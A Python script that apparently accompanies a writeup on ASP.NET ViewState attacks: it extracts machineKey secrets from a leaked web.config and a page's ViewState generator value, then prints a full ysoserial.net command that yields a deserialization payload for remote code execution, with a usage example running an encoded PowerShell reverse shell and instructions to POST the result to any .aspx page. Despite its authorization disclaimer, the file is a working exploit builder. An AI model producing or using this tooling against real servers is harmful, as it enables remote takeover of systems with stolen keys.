#!/usr/bin/env python3
"""
Assemble the ysoserial.net ViewState command from a leaked web.config and an
.aspx page. It only BUILDS the command string; it runs nothing and carries no
gadget tool. Use only against a target you are authorized to assess.
Writeup: https://jperezduerto.info/techniques/aspnet-viewstate-machinekey-rce/

    python3 viewstate-cmd.py web.config page.html "powershell -e <b64revshell>"

web.config  : a file containing the <machineKey ... /> element
page.html   : saved HTML of a target .aspx page (for __VIEWSTATEGENERATOR)
command     : the OS command you are authorized to run on the target
"""
import re
import sys


def attr(text, name):
    m = re.search(rf'{name}\s*=\s*"([^"]+)"', text, re.I)
    return m.group(1) if m else None


def main(cfg_path, page_path, command):
    cfg = open(cfg_path, encoding="utf-8", errors="ignore").read()
    mk = re.search(r"<machineKey\b[^>]*>", cfg, re.I)
    if not mk:
        sys.exit("no <machineKey> element found in that web.config")
    mk = mk.group(0)
    vk, dk = attr(mk, "validationKey"), attr(mk, "decryptionKey")
    valg = attr(mk, "validation") or "SHA1"
    dalg = attr(mk, "decryption") or "AES"
    if not vk or not dk:
        sys.exit("machineKey is missing validationKey or decryptionKey")

    page = open(page_path, encoding="utf-8", errors="ignore").read()
    gen = re.search(r'__VIEWSTATEGENERATOR"[^>]*value="([0-9A-Fa-f]+)"', page)
    gen = gen.group(1) if gen else None

    print("[*] parsed machineKey:")
    print(f"    validation={valg}  decryption={dalg}")
    print(f"    generator={gen or '(none found; try --generator=0000000000 or omit)'}\n")

    cmd = [
        "ysoserial.exe -p ViewState -g TypeConfuseDelegate",
        f'-c "{command}"',
        f'--validationkey="{vk}" --validationalg="{valg.split(",")[0]}"',
        f'--decryptionkey="{dk}" --decryptionalg="{dalg.split(",")[0]}"',
    ]
    if gen:
        cmd.insert(2, f'--generator="{gen}"')
    print("[+] command to run with ysoserial.net:\n")
    print("    " + " \\\n      ".join(cmd))
    print("\nPOST the output as the URL-encoded __VIEWSTATE field to any .aspx page.")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit("usage: viewstate-cmd.py web.config page.html \"<command>\"")
    main(*sys.argv[1:])
